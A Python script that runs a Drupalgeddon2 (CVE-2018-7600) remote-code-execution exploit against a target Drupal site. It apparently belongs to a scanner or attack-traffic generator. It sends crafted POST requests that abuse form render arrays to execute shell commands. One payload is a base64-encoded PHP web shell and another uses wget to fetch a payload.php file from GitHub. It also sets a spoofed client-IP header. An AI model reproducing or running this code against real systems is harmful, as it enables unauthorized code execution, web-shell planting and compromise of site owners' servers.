import random
import requests

# attempt a variety of drupalgeddon2 (cve-2018-7600)
def drupalgeddon2(target, source_ip, user_agent, **kwargs):
    attacks = []

    #generic payloads
    phpmethod = random.choice(['exec','system','passthru'])
    cmdpayload = random.choice([
                               'echo ";-)" | tee hello.txt',
                               'echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d',
                               'wget https://raw.githubusercontent.com/dr-iman/SpiderProject/master/lib/exploits/web-app/wordpress/ads-manager/payload.php'
                               ])

    # Drupal < 8.3.9 / < 8.4.6 / < 8.5.1
    attacks.append({
                  "method": "POST",
                  "url": "{}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax".format(target),
                  "payload": {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': phpmethod, 'mail[#type]': 'markup', 'mail[#markup]': cmdpayload}
                  })
   # Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1
    attacks.append({
                  "method": "POST",
                  "url": "{}/?q=user/password&name[%23post_render][]={}&name[%23type]=markup&name[%23markup]={}".format(target,phpmethod,cmdpayload),
                  "payload": {'form_id': 'user_pass', '_triggering_element_name':'name'}
                  })

    headers = {'User-Agent': user_agent,
               'True-Client-IP': str(source_ip),
               'Content-Type': 'application/x-www-form-urlencoded'
              }

    attack = random.choice(attacks)
    response = requests.request(attack['method'], attack['url'], headers=headers, data=attack['payload']).status_code
    return("drupalgeddon2: got {} with {}".format(response,attack['url']))
